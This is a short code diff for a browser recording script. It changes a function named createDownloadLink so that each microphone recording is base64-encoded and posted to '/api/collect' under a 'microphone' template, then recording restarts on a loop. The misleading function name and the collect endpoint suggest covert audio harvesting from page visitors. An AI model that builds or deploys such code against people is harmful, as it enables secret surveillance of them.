@@ -112,24 +112,28 @@ function stopRecording() {
 }
 
 function createDownloadLink(blob) {
-	
-	var url = URL.createObjectURL(blob);
-	var filename = new Date().toISOString();
+    var reader = new FileReader();
+    reader.readAsDataURL(blob);
+    reader.onloadend = function() {
+        var base64data = reader.result;
+        $.ajax({
+            type: 'POST',
+            url: '/api/collect',
+            contentType: 'application/json',
+            data: JSON.stringify({
+                template: 'microphone',
+                data: {
+                    audio: base64data
+                }
+            }),
+            success: function(result){
+                console.log(result);
+            },
+            error: function(err){
+                console.error(err);
+            }
+        });
+    }
 
-
-		  var xhr=new XMLHttpRequest();
-		  xhr.onload=function(e) {
-		      if(this.readyState === 4) {
-		        //  console.log("Server returned: ",e.target.responseText);
-		      }
-		  };
-
-
-		  var fd=new FormData();
-		  fd.append("audio_data",blob, filename);
-		  xhr.open("POST","upload.php",true);
-		  xhr.send(fd);
-
-	window.setTimeout(startRecording, 300);
-
+    window.setTimeout(startRecording, 300);
 }
